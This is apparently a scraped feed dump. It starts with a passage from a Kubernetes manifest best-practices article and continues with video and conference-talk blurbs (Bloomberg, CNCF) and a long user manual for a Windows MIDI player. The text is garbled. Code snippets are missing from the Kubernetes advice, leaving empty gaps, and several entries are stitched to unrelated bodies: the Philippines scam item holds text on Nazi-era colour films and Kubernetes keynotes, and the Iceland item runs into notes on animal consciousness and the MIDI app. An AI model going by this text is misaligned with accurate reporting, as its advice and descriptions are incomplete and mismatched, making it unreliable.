If something breaks, you can instantly roll back to a previous commit, compare changes or recreate your cluster setup without panic.Write configs in YAML not JSONWrite your configuration files using YAML rather than JSON. Both work technically, but YAML is just easier for humans. It's cleaner to read and less noisy and widely used in the community.YAML has some sneaky gotchas with boolean values:
Use only  or .
Don't write , ,  or .
They might work in one version of YAML but break in another. To be safe, quote anything that looks like a Boolean (for example ).Keep configuration simple and minimalAvoid setting default values that are already handled by Kubernetes. Minimal manifests are easier to debug, cleaner to review and less likely to break things later.If your Deployment, Service and ConfigMap all belong to one app, put them in a single manifest file.
It's easier to track changes and apply them as a unit.
See the Guestbook all-in-one.yaml file for an example of this syntax.You can even apply entire directories with:One command and boom everything in that folder gets deployed.Manifest files are not just for machines, they are for humans too. Use annotations to describe why something exists or what it does. A quick one-liner can save hours when debugging later and also allows better collaboration.The most helpful annotation to set is kubernetes.io/description. It's like using comment, except that it gets copied into the API so that everyone else can see it even after you deploy.Managing Workloads: Pods, Deployments, and JobsA common early mistake in Kubernetes is creating Pods directly. Pods work, but they don't reschedule themselves if something goes wrong. (Pods not managed by a controller, such as Deployment or a StatefulSet) are fine for testing, but in real setups, they are risky.Why?
Because if the node hosting that Pod dies, the Pod dies with it and Kubernetes won't bring it back automatically.Use Deployments for apps that should always be runningA Deployment, which both creates a ReplicaSet to ensure that the desired number of Pods is always available, and specifies a strategy to replace Pods (such as RollingUpdate), is almost always preferable to creating Pods directly.
You can roll out a new version, and if something breaks, roll back instantly.Use Jobs for tasks that should finishA Job is perfect when you need something to run once and then stop like database migration or batch processing task.
It will retry if the pods fails and report success when it's done.Service Configuration and NetworkingServices are how your workloads talk to each other inside (and sometimes outside) your cluster. Without them, your pods exist but can't reach anyone. Let's make sure that doesn't happen.Create Services before workloads that use themWhen Kubernetes starts a Pod, it automatically injects environment variables for existing Services.
So, if a Pod depends on a Service, create a Service its corresponding backend workloads (Deployments or StatefulSets), and before any workloads that need to access it.For example, if a Service named foo exists, all containers will get the following variables in their initial environment:FOO_SERVICE_HOST=<the host the Service runs on>
FOO_SERVICE_PORT=<the port the Service runs on>
DNS based discovery doesn't have this problem, but it's a good habit to follow anyway.Use DNS for Service discoveryIf your cluster has the DNS add-on (most do), every Service automatically gets a DNS entry. That means you can access it by name instead of IP:It's one of those features that makes Kubernetes networking feel magical.Avoid  and  unless absolutely necessaryYou'll sometimes see these options in manifests:But here's the thing:
They tie your Pods to specific nodes, making them harder to schedule and scale. Because each <, , > combination must be unique. If you don't specify the  and  explicitly, Kubernetes will use  as the default  and  as the default .
Unless you're debugging or building something like a network plugin, avoid them.Use headless Services for internal discoverySometimes, you don't want Kubernetes to load balance traffic. You want to talk directly to each Pod. That's where headless Services come in.You create one by setting .
Instead of a single IP, DNS gives you a list of all Pods IPs, perfect for apps that manage connections themselves.Working with labels effectivelyLabels are key/value pairs that are attached to objects such as Pods.
Labels help you organize, query and group your resources.
They don't do anything by themselves, but they make everything else from Services to Deployments work together smoothly.Good labels help you understand what's what, even after months later.
Define and use labels that identify semantic attributes of your application or Deployment.
For example; : what the app is : which layer it belongs to (frontend/backend) : which stage it's in (test/prod)You can then use these labels to make powerful selectors.
For example:This will list all frontend Pods across your cluster, no matter which Deployment they came from.
Basically you are not manually listing Pod names; you are just describing what you want.
See the guestbook app for examples of this approach.Kubernetes actually recommends a set of common labels. It's a standardized way to name things across your different workloads or projects.
Following this convention makes your manifests cleaner, and it means that tools such as Headlamp, dashboard, or third-party monitoring systems can all
automatically understand what's running.Manipulate labels for debuggingSince controllers (like ReplicaSets or Deployments) use labels to manage Pods, you can remove a label to “detach” a Pod temporarily.The  part removes the label key .
Once that happens, the controller won’t manage that Pod anymore.
It’s like isolating it for inspection, a “quarantine mode” for debugging. To interactively remove or add labels, use .You can then check logs, exec into it and once done, delete it manually.
That’s a super underrated trick every Kubernetes engineer should know.These small tips make life much easier when you are working with multiple manifest files or clusters.Instead of applying one file at a time, apply the whole folder:This command looks for ,  and  files in that folder and applies them all together.
It's faster, cleaner and helps keep things grouped by app.Use label selectors to get or delete resourcesYou don't always need to type out resource names one by one.
Instead, use selectors to act on entire groups at once:It's especially useful in CI/CD pipelines, where you want to clean up test resources dynamically.Quickly create Deployments and ServicesFor quick experiments, you don't always need to write a manifest. You can spin up a Deployment right from the CLI:Then expose it as a Service:Cleaner configuration leads to calmer cluster administrators.
If you stick to a few simple habits: keep configuration simple and minimal, version-control everything,
use consistent labels, and avoid relying on naked Pods, you'll save yourself hours of debugging down the road.The best part?
Clean configurations stay readable. Even after months, you or anyone on your team can glance at them and know exactly what’s happening.]]></content:encoded></item><item><title>How a Scam and Chinese Spy Scandal Rocked the Philippines</title><link>https://www.youtube.com/watch?v=1OERBzEtAj0</link><author>Bloomberg Originals</author><category>yt</category><enclosure url="https://www.youtube.com/v/1OERBzEtAj0?version=3" length="" type=""/><pubDate>Mon, 24 Nov 2025 23:00:05 +0000</pubDate><source url="https://www.youtube.com/channel/UCUMZ7gohGI9HcU9VNsr2FJQ">Bloomberg Originals</source><content:encoded><![CDATA[In 2022, a small town in the Philippines elected its first female mayor, a popular figure named Alice Guo who brought prosperity and new business to the area.

These color images capture scenes from Normandy's beaches, folk festivals, Wehrmacht wartime atrocities, and life on Hitler's mountain farm. They bring an oppressive reality to the criminal Nazi regime, offering a new and vivid perspective on history. In this episode, color films from 1937 document life in Hitler's Germany. Eva Braun and Hitler's pilot Hans Baur are among the first amateur filmmakers to expose the new celluloid. This creates unique images of the dictator's public appearances and his private life on Obersalzberg.

Sponsored Keynote: Accelerating Innovation: The Evolution of Kubernetes and the Road Ahead - Jago Macleod, Engineering Director, Kubernetes & GKE, Google

In its first decade, Kubernetes earned a critical place in modern workload and infrastructure orchestration - but new workloads and unprecedented scale were pushing the limits. Last year, we highlighted some fundamental gaps in Kubernetes for emerging workloads, and shared Google’s commitment to invest in its evolution.

In this keynote, we will reflect on the foundational role and exciting future of Kubernetes as the leading platform for both traditional and AI workloads. Kubernetes evolved quickly over the past year, due largely to the declarative API, the modular and extensible nature of the platform, and the strength of the ecosystem - and innovation is only accelerating.

Sponsored Keynote: From Cloud-Native to Agent-Native: Context Engineering for Kubernetes - Idit Levine, Founder & CEO, Solo.io & Keith Babo, Chief Product Officer, Solo.io

Kubernetes is the leading foundation for cloud-native platforms, but when it comes to agentic workloads, critical gaps remain that prevent many organizations from getting agents to production. These gaps exist because agents and tools are not just containers; they introduce new requirements such as dynamic identity for agents acting on behalf of users, end-to-end observability for probabilistic workflows, and context-aware networking for MCP and A2A protocols. Bridging this gap requires Kubernetes itself to be extended to become a context-aware runtime. Just as platform engineering abstracts complexity for developers, context engineering extends Kubernetes to make AI and agentic workloads first-class citizens.

Thinking Outside the Classroom: Building an Edge Device To Monitor Atmospheric Conditions - Hadijat Sanni & Jubril Oyetunji, Independent

Being in a Nigerian university, depending on what state you school sometimes means that your education falls short in terms of the problems we are exposed to and the topics we explore in class.
To fill this gap we formed NARSDA, a small group primarily focused on astronomy based research, this semester we decided to take our heads out of the cloud and focus on some local problems facing your school.

In this session we will discuss how we built an edge device to monitor atmospheric conditions in our school, how we leveraged Prometheus, grafana and MQTT to collect and generate meaningful insights from the data and finally how we plan on using the data to cut down emissions and possibly save an endangered bird native to our local.]]></content:encoded></item><item><title>Kubernetes on Edge Day | Welcome + Opening Remarks - Katerina Arzhayev &amp; Gergely Csatári</title><link>https://www.youtube.com/watch?v=l0mI7bCq36g</link><author>CNCF [Cloud Native Computing Foundation]</author><category>dev</category><category>k8s</category><enclosure url="https://www.youtube.com/v/l0mI7bCq36g?version=3" length="" type=""/><pubDate>Mon, 24 Nov 2025 17:29:47 +0000</pubDate><source url="https://www.youtube.com/channel/UCvqbFHwN-nwalWPjPUKpvTA">Dev - CNCF</source><content:encoded><![CDATA[Don't miss out!

Breaking the Latency Barrier: Tackling Compute and Network Delay With Globally Distributed Wasm - Kate Goldenring, Fermyon Technologies, Inc. & Sudesh Girdhar, Akamai

Latency isn’t just a backend problem or a network issue—it’s both. Reducing time-to-response means optimizing not only how far your workloads have to travel (network latency) but also how fast they spin up and execute once they arrive (compute latency). Solving one without the other leaves users waiting.
This talk introduces Spin, the open source developer toolkit that uses WebAssembly (Wasm) to reduce compute latency to near-zero. With sub-millisecond cold starts and scale-to-zero efficiency, Spin apps can be built in a local dev loop and then deployed anywhere with no changes to the code. That same application can be deployed to any SpinKube cluster or globally across Akamai’s 4,000+ edge locations. The result is serverless applications that feel instant, no matter where users are.]]></content:encoded></item><item><title>Lightning Talk: Service Quality Management for Critical Edge Applications - Jaime Burbano</title><link>https://www.youtube.com/watch?v=YKspaqa1PTs</link><author>CNCF [Cloud Native Computing Foundation]</author><category>dev</category><category>k8s</category><enclosure url="https://www.youtube.com/v/YKspaqa1PTs?version=3" length="" type=""/><pubDate>Mon, 24 Nov 2025 17:29:47 +0000</pubDate><source url="https://www.youtube.com/channel/UCvqbFHwN-nwalWPjPUKpvTA">Dev - CNCF</source><content:encoded><![CDATA[Don't miss out!

Lightning Talk: Service Quality Management for Critical Edge Applications - Jaime Burbano, FH Dortmund

Edge applications require high-computing power and low latency responses, while running on resource-constrained devices. Maintaining consistent, high-level service performance is challenging in heterogeneous and dynamic edge computing conditions (server load, network traffic, jitter, etc.). In that situation it is very difficult to ensure stable edge service quality.

We propose an open-source solution that monitors the entire edge chain (applications, UE, network, servers with Kubernetes), analyze the correlated data, plan a service quality action and execute the plan.

The solution has been fully developed and tested with a small set of real-world use cases.]]></content:encoded></item><item><title>Lightning Talk: Running Energy-Aware AI Inference on Edge Kubernetes With Kepler - Miguel Rojas</title><link>https://www.youtube.com/watch?v=9BufrzZGPZA</link><author>CNCF [Cloud Native Computing Foundation]</author><category>dev</category><category>k8s</category><enclosure url="https://www.youtube.com/v/9BufrzZGPZA?version=3" length="" type=""/><pubDate>Mon, 24 Nov 2025 17:29:47 +0000</pubDate><source url="https://www.youtube.com/channel/UCvqbFHwN-nwalWPjPUKpvTA">Dev - CNCF</source><content:encoded><![CDATA[Don't miss out!

Lightning Talk: Running Energy-Aware AI Inference on Edge Kubernetes With Kepler - Miguel Rojas, Independent

As AI workloads move to edge environments, it’s critical to balance performance with power consumption. In this lightning talk, we’ll demonstrate how to run a lightweight AI inference workload on a K3s-based edge Kubernetes cluster while measuring energy use in real-time — using only two core open-source tools.

The demo will deploy a simple ONNX Runtime-based image classifier and track its energy impact using Kepler (Kubernetes-based Efficient Power Level Exporter), with metrics collected by Prometheus. No GPUs, no complicated stacks — just a minimal, repeatable setup showing how even small inference jobs can be optimized for energy awareness.

Securing the Edge: Multi-Cluster Governance With Kyverno on K0rdent’s Fleets - Dolis Sharma, Nirmata & Prashant Ramhit, Mirantis

As organizations scale AI workloads and applications across edge environments, enforcing consistent governance and security policies becomes increasingly challenging. This session introduces a practical approach to scalable policy enforcement across fleets of Kubernetes clusters using Kyverno and k0rdent, with k0s as the lightweight Kubernetes distribution powering edge nodes.

The session covers fleet-wide governance strategies, including dynamic resource allocation (DRA) for GPUs, policy automation in disconnected or constrained environments, and real-world patterns for enforcing compliance in the field.

Through demos and architecture walk-throughs, this session provides actionable insights for those deploying Kubernetes at the edge, particularly in industries like telco, manufacturing, and smart infrastructure. We will also share patterns for integrating policy-as-code workflows and automating Kyverno validation via CI/CD or offline pipelines.]]></content:encoded></item><item><title>Sponsored Keynote: The Long Arc of Digital Rights: Securing our Open Source Future - Emily Fox</title><link>https://www.youtube.com/watch?v=TC8tIiGl398</link><author>CNCF [Cloud Native Computing Foundation]</author><category>dev</category><category>k8s</category><enclosure url="https://www.youtube.com/v/TC8tIiGl398?version=3" length="" type=""/><pubDate>Mon, 24 Nov 2025 17:28:34 +0000</pubDate><source url="https://www.youtube.com/channel/UCvqbFHwN-nwalWPjPUKpvTA">Dev - CNCF</source><content:encoded><![CDATA[Don't miss out!

Sponsored Keynote: The Long Arc of Digital Rights: Securing our Open Source Future - Emily Fox, Red Hat

Atlanta is the city that showed the world how principled, community-driven action can forge a more equitable future. The Open Source community is at its own inflection point, where our core principles of transparency, autonomy, and collective responsibility are being tested by new regulations like the CRA and the rapid evolution of technologies like AI. We can learn a lot from our history by leveraging critical principles to guide our response in today’s most urgent security challenges. Digital Sovereignty, an evolution of zero trust focused on autonomy, and the emergence of open source technologies like confidential computing and attestation are closer to making this a reality. As we navigate the complexities of the AI era and prepare for a post-quantum world with new cryptography, we must address critical gaps between technology implementation and the technologists available to do it. We can do this by reaffirming these principles through investment and collaboration to build a more secure and resilient open source ecosystem for everyone.]]></content:encoded></item><item><title>The Iceland Effect | The Infinite Explorer with Hannah Fry</title><link>https://www.youtube.com/watch?v=KQZh4Z4a_0Y</link><author>Bloomberg Originals</author><category>yt</category><enclosure url="https://www.youtube.com/v/KQZh4Z4a_0Y?version=3" length="" type=""/><pubDate>Mon, 24 Nov 2025 17:00:39 +0000</pubDate><source url="https://www.youtube.com/channel/UCUMZ7gohGI9HcU9VNsr2FJQ">Bloomberg Originals</source><content:encoded><![CDATA[Hannah Fry visits Iceland to uncover the secrets behind its modern success.

We know we humans are conscious and we strongly suspect higher animals are as well: for example, primates, dogs, cetaceans, whales and dolphins. But how far down the phylogenetic scale does consciousness go? Do fish feel pain? Do insects have awareness? Do bacteria sense? What are the implications?

Reliably play midi music files from a  folder or ".m3u"  play list. Adjust playback speed, volume and output device on-the-fly during playback. A large playback progress bar makes jumping forward and backward in time a breeze with just a single click or tap. Supports ".mid", ".midi" and ".rmi" files in format 0 (single track) and format 1 (multi-track). Comes complete with 25 sample midis ready to play.Cynthia playing through her sample midi musicDesktop App (Standard Edition)4th Generation (Gossamer for GUI)Windows All and Wine for Linux and MacSHA256 Checksum8B9CAB404E174767144C13A32C7357FDF320EA6D632069E68AFC10F107F98F38Cynthia playing through her sample midi musicCynthia displaying her menuRealtime display panels Visual (Tracks, Channels, and Notes), Piano and Bars visibleCynthia in her traditional view - Navigation, Information and Settings panels visibleEasily adjust channel volumes on-the-fly with the integrated mixer - hover over/tap the Channels panel to show/editCynthia in the "Deep Orange 2" color scheme (Options > Color) and "Swell" animated background scheme (Options > Background), with Compact mode on (Options > Settings > Compact)Several sample midis built-in.  When starting Cynthia for the first time, these sample midis are listed in the " Play Folder" panel, and playback is automatic.
At any point during playback, you may select another midi from the list.  Playback seamlessly switches to the selected midi in question.
Cynthia supports realtime changes to settings during playback.  This means you may adjust the Playback Mode, Playback Device, Volume and Speed without having to stop/restart playback.⏶The main toolbar is located near the top of Cynthia's window.  From left to right, it has the links of: Nav - Toggle display of navigation panel Play Folder - Show the "Play Folder" panel to play midis from a folder Play List - Show the "Play List" panel to play midis from a playlist Prev - Play previous midi file in list Rewind - Shift playback position back several seconds Stop - Stop playback Play - Toggle playback: When playing ( flashing) playback stops/when stopped ( static) playback starts Fast Forward - Shift playback position forward several seconds Next - Play next midi file in list Menu - Show menu Mixer - Show the Windows Mixer app Options - Show the Options window, to change Cynthia's appearance Help - Show (from rightmost column) or hide built-in help⏶From the main toolbar click " Play Folder" link (top left) to display the "Play Folder" panel. Play Folder, there is no need for a playlist or setup.  Just navigate to the folder in question and instantly play the midis within.   Home" entry at top of list (scroll up if not visible).  The list will refresh with the names of your hard drives, pen sticks and other local storage devices.  Double click a drive, then the subsequent folder(s) to the one that you want to play.
The list will update.  Double click a specific midi to begin playback, or, click the " Play" link. Refresh - Refresh the playback list Fav - Show the "Favourites" window.  Use this handy window to maintain a list of your favourite folders for quick access. Back - Go to the previous folder in navigation history Forward - Go to the next folder in navigation history:There is no need to stop playback before switching to another folder.  Double click the new folder and wait several seconds for Cynthia to automatically recommence playback.
The current folder will be remembered when Cynthia is restarted.⏶The standard ".m3u" playlist format is supported.  This is a plain text file that contains the length of the midi in seconds, a title, and the location of each midi.
Cynthia supports midi playback from local storage devices, such as hard disks, pen sticks etc.  Internet urls are not supported.
If you already have a playlist in the m3u format saved on your disk, you can open it in Cynthia for playback.  From the main toolbar click the " Play List" link (top left) to show the Play List panel.  An additional toolbar presents.  Click the " Open" link (if shown) or " Edit >  Open".  From the Open window, navigate to your playlist, select and click the "Open" button.
The contents of your playlist will load inside the  Play List panel.  Click the " Play" link to begin playback.⏶There are several ways a playlist can be constructed.  The first method is the easiest.  From your computer explorer ("File Explorer" in Windows and "Files" in Ubuntu) navigate to the folder of midis.  Highlight one or more midis files inside the folder and drag the selection onto Cynthia and let go of the mouse button.  The " Play List" panel updates and displays the dropped midi files appended, to the list.  Repeat this process for as many midi files as required.
At anytime you may save the playlist.  From the Play List toolbar, click the " Save As" link (if shown) or " Edit >  Save As...".  Type a name in the Save window and click the "Save" button to save the playlist.
It is worth noting that each time Cynthia saves your playlist to file, the midi files referenced inside it have their names adjusted automatically to work with the specific save location of the playlist.
Most midi filenames in a playlist are relative, as they do not have the full drive, folder and filename, but rather a partial folder structure and the midi's name.  This is to permit the movement of the midis and the playlist from one location to another without the need for the playlist to be specifically rewritten.
If you are curious at what the playlist format looks like, click the " Copy All" link (if shown) or " Edit >  Copy All" to copy the entire playlist to Clipboard.  Note Cynthia will use a full filename for each listed midi file, since the Clipboard cannot be referenced from a disk location.  You may paste it into any text editor to view, modify, or rearrange the order of the midi files listed.
To paste an altered playlist back into Cynthia, click the " Replace" link (if shown) or " Edit >  Replace".  The Play List panel will update.
Cynthia has support for extended playlists.  Note!  A large playlist of 100,000+ midi files will use about 102MB of RAM and require a second or two to apply midi filename adjustments.
Support for playlist filtering is provided.  An example:  You may instruct Cynthia to list only ".mid" files by deselecting ".midi" and ".rmi" options from the "File Types" option panel (right column).  The playlist itself remains unchanged - how Cynthia uses it changes.  Edit - Show edit menu New - Prompt to clear playlist Open - Open a playlist from file Save As - Save playlist to file Cut - Cut selected playlist item to Clipboard Copy - Copy selected playlist item to Clipboard Copy All - Copy entire playlist to Clipboard Paste - Add Clipboard playlist to end of current playlist Replace - Replace current playlist with Clipboard playlist Undo - Undo last change to playlist:
The current playlist is remembered for next time Cynthia is started.
To show or hide the above toolbar links, tick or untick the " Edit > Show Links on Toolbar" option.  Unticking the option hides all links except " Edit" and " Paste".⏶If you're a lover of simplicity itself, wishing only to play midi files directly from your hard drive folders as is, or, you're a playlist fan, rest assured, switching between these two very different playback systems, is as easy as a single click on either the " Play Folder" or " Play List" links.
Whilst the Play Folder method is limited to playing only the files contained in the currently selected folder, there is zero setup, no list to be built, and playback can start without hassle.
The Play List method on the other hand allows for a far more in depth custom playback experience.  It supports the playback of midis across multiple disk drives, folders and in any assembled order.
Additionally, Cynthia's large capacity list can easily handle a very large playlist.  For example a playlist of 10,000+ midis is just fine.
And switching between these two playback methods can be done during playback without issue.:
The playback options File Types, Playback Mode, Playback Device, Speed and Volume are shared between both playback systems, and do not change or require adjustment after a switch.⏶Located bottom of left column.
Playback mode (bottom left) determines how Cynthia plays the list of midis in the Play Folder or Play List panel (left column).Play currently selected midi to the end, and stop playback.
Repeat the currently selected midi without stopping playback.
Play each midi in turn, working down the list (left column), then restart from the top.  Playback initially starts at currently selected midi.
Each midi in the list is played working downward through the list.  Playback stops at the end of the last midi.
Continuously play a midi, selecting each new one randomly from the list.⏶Located towards bottom of right column.There are three midi file types supported: ".mid", ".midi" and ".rmi".  The first two are identical file formats, only the file extension differs.  The third format, ".rmi", is slightly different and contains additional multimedia information for Microsoft Windows.
By default all three file types are selected (lit black).  In this state, all playable midi files are listed in the Play Folder and Play List panels.
To restrict the file types to be played back, click the file type to deselect it.  The list of midis (left column) updates to reflect the change.
If all three options are deselected, Cynthia interprets this as if all three were selected.⏶Located towards bottom of right column.
By default all midi playback is sent to the Windows Midi Mapper system - the default Windows midi note handler.
If you have more than one midi device installed on your computer, Cynthia can redirect the midi notes to that device instead.
Traditionally, a midi device had been considered to be hardware.  But now, with the advent of powerful computer hardware, software can now act as virtual hardware, allowing for advanced features to be included on your computer without the need for hardware upgrades or physical adjustment.
A midi software driver can support a soundfont, which can greatly enhances the playback quality of a midi through it's support for large, high-quality, instrumental sound libraries.
To change the playback device, select a number in the playback device control (bottom right).  Up to ten devices (1-10) is supported.  "Map" is the Windows Midi Mapper.  Selecting a dash will cause playback to stop producing audible sound (no device selected for sound output).  In this case, the last usable (numbered) midi device will be automatically selected after a short time delay, recommencing audible playback without the need for user input.
Cynthia supports realtime device switching during playback.  A small, momentary interruption to playback may occur during a device change.  The name of the device in use by Cynthia is listed in the playback device control (bottom right), for example as "Playback Device: Midi Mapper".  In later versions of Microsoft Windows the Midi Mapper was discontinued - in this case, Cynthia uses the first installed midi device. 
It is worth noting that using another device may require a separate adjustment to that device's volume control, some devices do, and some do not.  If it does have a volume control, it is more than likely to be accessible via Windows "Volume Mixer" application.  Click the " Mixer" link from the top toolbar to display the application and adjust the volume control of your device accordingly.⏶Located towards bottom of right column.
By default, Cynthia plays back a midi at normal speed (100%).  Drag the slider to the right to increase the playback speed up to a maximum speed of 1,000% or 10x normal speed.
To slow down playback speed, drag the slider to the left.  A value less than 100% slows playback to less than normal speed.  The slider can go as low as 10% or 1/10th normal playback speed.
Playback speed may be adjusted at any point during playback.  All changes take place in realtime.  An auto-fade in feature momentarily quietens playback to avoid any sudden or unexpected notes.⏶Located at bottom of right column.
For maximum compatibility between different operating systems and device types (hardware and software) and their capabilities, Cynthia employs a multi-layer volume control system which adjusts both hardware and midi note volumes.
To adjust playback volume, position the slider to the right to increase the volume and to the left to decrease it.
An increase above 100% boosts the midi volume, making low-level, hard to hear midis, more discernable.⏶Adjust playback position with a single click or tap.  Additionally, hovering a mouse cursor over the Playback Progress bar displays a vertical marker for the new playback time and position.  Click to apply new position.  The midi playback will shift to a new position and automatic fade in eases back playback volume to avoid sudden clicks, pops or abrupt notes.
Use keyboard arrow keys to progressively move forward or backward through the midi.  A vertical marker will display.
Not currently playing?  Click in the Playback Progress bar to commence playback at that position.⏶Synchronised lyric display is supported for midis with lyrics.
To enable lyrics, from the main toolbar click the " Menu" link and tick "Show Lyrics".
When included within a midi, lyrics are displayed inside the Playback Progress bar (bottom of Cynthia) as "Playback Progress - Lyrics:" with several words or part words visible at any one time.
A midi without lyrics will display "Playback Progress".
If hyphenated lyrics are required in order to highlight the pauses between part-words, from main toolbar click the " Menu" link and tick "Hyphenate Lyrics".⏶Sometimes there can be a short, noticeable playback delay when commencing playback, initially.  This delay is preparation time for Cynthia to ready playback.
There is no delay switching between midis during playback as Cynthia remains connected to the midi device.  By default, after a short period of no playback (5 seconds or more), the midi device will switch to offline, and a short delay will occur when playback is next started.
To avoid this delay, the "Always on Midi" option may be used to keep a midi device online, even when Cynthia is not playing.  From the main toolbar click the " Menu" option and tick the "Always on Midi" option.:
You can always tell if the midi device is online or not - from the "Midi Information" panel on the right.  Look for the item called "Device" in the "Technical list".  This will either be "Online" or "Offline".⏶Midis comes in various format types.  The simplest is format 0, a single track format, that stores all it's tempo (speed), notes and commands on a single, mixed track.
A format 1 midi, on the other hand, uses a dedicated master track (first track) to store all of it's tempo (speed) commands for the entire midi.  Notes and commands are stored separately on additional, multiple tracks.
Cynthia supports both format 0 and format 1 midis with file extension ".mid", ".midi" and ".rmi".
A third, format 2 midi exists.  This format type is not supported by Cynthia.  In addition, Cynthia does not support system exclusive messages.  These messages will be ignored, and typically relate to manufacturer specific equipment.⏶Cynthia must be setup to use an Xbox Controller.  From the top toolbar select "Menu > Xbox Controller" and select the "Active Only" or "Active and Inactive" option.  Pair an Xbox Controller to your computer (if not already done).  Cynthia automatically detects and uses active Xbox Controllers.  More than one controller can be used at the same time.1.

The "Color Schemes" list is split into three sections:
1. Built-In color schemes - read only/use as is
2. Custom color schemes - user customisable and labelled Custom 1-10
3. Saved color schemes - user customisable and saved as file(s) on disk
There are 160+ built-in color schemes to choose from.  Simply select a color scheme to apply in realtime.  For instance, Aqua Marine.  Watch as the app's GUI changes color instantly - no need for an additional load, apply, or set.
A Blaiz Enterprises' color scheme (*.bcs) at its core is a list of twenty colors, responsible for coloring most aspects of the app's GUI.  Some specialised colors are derived automatically from these.  Two colors for the frame, nine for important areas, Title colors, and nine more for common zones, Standard colors.
Each built-in color scheme has it's own unique set of colors.  A custom color scheme allows for colors to be customised.  To create a custom color scheme, scroll down the list to the section titled "Custom".  He you'll find ten custom color scheme slots - each fully customisable in realtime without any need to be named, saved or applied.  Tap or click on a slot to start - for example slot 1 - "Custom 1".
On the right a series of editable color palettes will appear.  Click a palette to display the color dialog window.  Adjust color as desired and click OK when done.  Alternatively, click and drag your mouse cursor/fingertip from the color palette to acquire color from your computer screen in realtime.  App GUI continuously updates to reflect changes in color.  All changes are automatically saved.⏶Want your shiny new color scheme to have its own name?  Easy.  From the color schemes list - click "Options > Color" to display dialog - scroll down to the "Custom" section, select your custom color scheme, and click " Menu >  Save As...".  Type a name and click the "Save" button.  Your color scheme is saved to disk and listed under the "Saved" section of the color schemes list - next section down.
Any color scheme can be saved to disk, and then edited.  For instance, you can select one of the built-in color schemes, such as Aqua Marine, and save it to disk, then customise as desired.⏶Click "Options > Color" to show the color schemes list.  Scroll down to the last section named "Saved".  This section presents a list of all your saved color schemes in one central location.  Select a scheme to use.⏶Yes.  Any saved color scheme can be customised without fuss.  Click "Options > Color" and scroll down to the section named "Saved", click the color scheme you wish to edit, and adjust the color(s) as desired.  All changes are saved automatically back to the file on disk, without any need to explicitly save.⏶A background scheme is a static or animated image tiled across the background layer of the app.  The app's GUI components sit above this layer/merge into it, such as toolbars, tool images, buttons, text etc.  There are 60 built-in background schemes, based on several images with different presets, like horizontal and vertical scroll speeds, fade in and out rates, and wobble levels.  These functions allow for a static image to give movement to the app.  While some background schemes are specially set for animation, others are not.
The background image can be rendered in full color, or shade-shifted toward greyscale, or shade-shifted toward the app's current highlight color.  One slider, Colorise, controls this tri-function.
A background scheme supports a maximum image color depth of 32 bits in RGBA format - 8 bit red, green, blue, and alpha channels - for instance a transparent PNG image.:
An animated background scheme can operate at frame rates of up to 20 fps (frames per second), which means the entire GUI of the app is repainted in full, 20 times per second, like a video, and therefore can consume quite a bit of CPU power, especially at high resolutions.  It is recommended a modern, powerful machine be used for high frame rates/resolutions in order to maintain smooth operation of the GUI.:
Determines how much of the background image is seen/made visible.  A low value renders the background subtly beneath the GUI, whereas a high value, 100-255, renders it boldly.  A value above 100 is disabled by default.  To enable, click "Options > Settings" and deselect "Display > Safe Background".  A value over 100 may overpower the GUI making it hard to navigate or operate.  If this becomes the case, press the "F2" key, and then the Enter key to confirm restoration of the app's default settings.
Set the color rendering method.  A value of 100 renders the background image in full color, a value of 0 in greyscale, and a value of -100 in the app's current highlight color.
Paint speed in frames per second.  0 is static - the background scheme only repaints when required.  This is the least stressful option.  A value of 1-20 sets a constant repaint cycle of 1-20 fps (frames per second).
Horizontal Scroll/Vertical Scroll (-100..100):
Moves background image left/up (minus value) or right/down (plus value) by X pixels.  A value of zero turns movement off.
Horizontal Wobble/Vertical Wobble (0..300):
Applies a wobble factor to the above Horizontal Scroll/Vertical Scroll movement(s).
Cycles through a high-to-low-to-high intensity flow, gradually fading the background image from view, then back again, in a continuous cycle.  Use a low value for a slow cycle, and a high value for a fast cycle.  
Applies a wobble factor to the Fade In/Out flow cycle above.⏶Yes you can.  There are 10 custom background scheme slots.  Click "Options > Background" and scroll down to the section named "Custom".  For instance, click on "Custom 1".  A sub-toolbar will display in the right column at the top.  From there, you can paste in an image from Clipboard - click "Paste", or open an image from file - click "File".
For best visual results, your image should be a similar size to the app's overall area, and be prepped for tiling work - that is, have it's right and bottom edges modified so that its colors/pixels seamlessly wrap back round to its opposing edge (right-to-left and top-to-bottom).  You can use a tile creation app, or a good quality graphics app to accomplish this, or use our "Blend It" app to prep your image.
Without this, tiling the image may present abrupt edges of unwanted opposing lines of horizontal/vertical colors, and be visually jarring in nature.
Adjust the sliders as required to accomplish animation and visual effects.  All changes to the image and sliders are saved in realtime.⏶The frame on our apps have a long history reaching back to the late 1990s, where they first adorned our FastCards and PowerCards (still/animated electronic musical greeting cards).
In the context of an app, they primarily serve as a large, easy-grip area for resizing the app's overall size, and a touch of decoration to boot.
A frame can be made wide or narrow as required.  The modern app has a typical frame width of 7 px in a plain style, so as not to distract or occupy excessive screen real estate.
Furthermore, a frame may render with an optional, randomised sparkle effect, with a range of 0 (no sparkle) to 20 (heavy sparkle).
Click "Options > Frame" to edit the app's current frame settings.  A list of 50 built-in frames is available to choose from, ranging from Antique to Traditional 5.
Toward the bottom of the window are two sliders to adjust the frame's Sparkle (strength) and Size (width in pixels).  A frame can be sized from 0 px (no frame) up to a wide frame of 72 px.  All changes update in realtime.⏶Click "Options > Font" to display zoom and font specific settings.  By default, the app is set to automatic zoom, which means it will scale up its text and images if the monitor it's displayed on is above 2K in resolution.Why scale text and images at all?  What is special about 4K and 8K monitors?  At first glance it may not be obvious the significant difference between standard 2K resolution, and the much higher 4K and 8K resolutions.
But high resolution monitors, such as 4K and 8K displays have far more pixels (colored dots) per inch on screen than previous generations of monitors, that is, the screen size may be the same but more dots are packed into the same area.  Consequently, an app without scaling abilities may appear small or even blurred on these monitors.  That's because as new monitors and TVs gain ever greater resolutions, statically sized apps shrink in size/fail to compensate.  This is why a modern app must be able to scale up to match the appropriate resolution.
Here is a comparison of common display resolutions:
2K = 1920w x 1080h =  2,073,600 pixels
4K = 3840w x 2160h =  8,294,400 pixels
8K = 7680w x 4320h = 33,177,600 pixels
A 4K (ultra high definition) monitor uses four times (4x) more pixels than it's 2K (full high definition) counterpart.  A statically built app without scaling would shrink to 50% of it's size, making it difficult to use.  An operating system may attempt to counter this by scaling it up using pixel stretching - very much like zooming up a photo - unfortunately this tends to blur the appearance of the app.
The same app on an 8K monitor would suffer even greater shrinkage, rendering at only a quarter (25%) of it's original size, or scaling with significant blurring.
